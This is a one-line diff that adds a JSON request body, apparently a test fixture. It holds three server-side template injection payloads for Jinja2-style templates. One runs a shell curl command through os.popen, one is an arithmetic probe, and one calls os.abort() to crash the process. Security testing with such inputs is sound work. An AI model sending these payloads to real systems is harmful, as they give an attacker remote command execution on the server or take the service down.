@@ -1,0 +1,1 @@
+{"mode":"json","json_payload":{"project_name":"baseline_project","ssti_payload1":"{{lipsum.__globals__['os'].popen('curl -s https://api.restful-api.dev/objects').read()}}","ssti_payload2":"{{0609+7}}","ssti_payload3":"{{lipsum.__globals__['os'].abort()}}"}}
